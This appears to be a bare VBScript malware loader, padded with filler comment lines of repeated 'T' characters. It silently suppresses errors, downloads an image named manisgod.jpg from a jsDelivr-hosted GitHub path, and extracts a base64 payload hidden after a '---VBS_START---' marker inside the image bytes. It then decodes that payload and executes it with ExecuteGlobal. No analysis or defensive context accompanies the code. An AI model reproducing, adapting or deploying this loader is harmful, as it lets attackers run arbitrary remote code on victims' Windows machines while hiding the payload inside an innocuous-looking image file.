' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
On Error Resume Next 
Dim http, stream, b, i, j, match, delimiter
delimiter = "---VBS_START---"
Set http = CreateObject("MSXML2.ServerXMLHTTP")
http.Open "GET", "https://cdn.jsdelivr.net/gh/ocalbackgox/assets@main/manisgod.jpg", False
http.Send
' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
If http.Status = 200 Then
    b = http.responseBody
    For i = 0 To LenB(b) - Len(delimiter)
        match = True
        For j = 1 To Len(delimiter)
            If AscB(MidB(b, i + j, 1)) <> Asc(Mid(delimiter, j, 1)) Then
                match = False: Exit For
            End If
        Next
        If match Then
            Set stream = CreateObject("ADODB.Stream")
            stream.Type = 1: stream.Open: stream.Write b
            stream.Position = i + Len(delimiter)
            
            Dim b64Stream, b64Text
            Set b64Stream = CreateObject("ADODB.Stream")
            b64Stream.Type = 1: b64Stream.Open: stream.CopyTo b64Stream
            b64Stream.Position = 0: b64Stream.Type = 2: b64Stream.Charset = "utf-8"
            b64Text = b64Stream.ReadText
            Dim plainVbsCode
            plainVbsCode = Base64Decode(b64Text)
            ExecuteGlobal plainVbsCode
            
            b64Stream.Close: stream.Close: Exit For
        End If
    Next
End If
Function Base64Decode(byVal base64String)
    On Error Resume Next
    Dim xml, elem
    Set xml = CreateObject("MSXML2.DOMDocument.3.0")
    Set elem = xml.CreateElement("tmp")
    elem.DataType = "bin.base64"
    elem.Text = base64String
    
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1: stream.Open
    stream.Write elem.NodeTypedValue
    stream.Position = 0: stream.Type = 2: stream.Charset = "utf-8"
    
    Base64Decode = stream.ReadText
    stream.Close: Set stream = Nothing: Set elem = Nothing: Set xml = Nothing
End Function
' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
' TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
